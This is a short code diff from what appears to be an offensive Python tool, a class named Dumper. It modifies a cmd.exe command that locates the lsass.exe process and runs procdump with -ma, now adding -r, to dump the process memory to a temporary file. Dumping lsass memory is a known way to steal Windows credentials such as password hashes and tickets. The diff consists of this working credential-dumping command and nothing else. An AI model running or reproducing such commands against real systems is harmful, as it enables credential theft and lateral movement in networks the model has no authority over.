@@ -181,7 +181,7 @@ class Dumper:
         self.procdump = True
 
         # Dump lsass using PID
-        command = """cmd.exe /Q /c for /f "tokens=2 delims= " %J in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do {}{} -accepteula -o -ma %J {}{} & if NOT EXIST {}{} (echo FAILED > {}{})""".format(
+        command = """cmd.exe /Q /c for /f "tokens=2 delims= " %J in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do {}{} -accepteula -o -r -ma %J {}{} & if NOT EXIST {}{} (echo FAILED > {}{})""".format(
             self._tmp_dir, self._procdump,
             self._tmp_dir, self._remote_lsass_dump,
             self._tmp_dir, self._remote_lsass_dump,
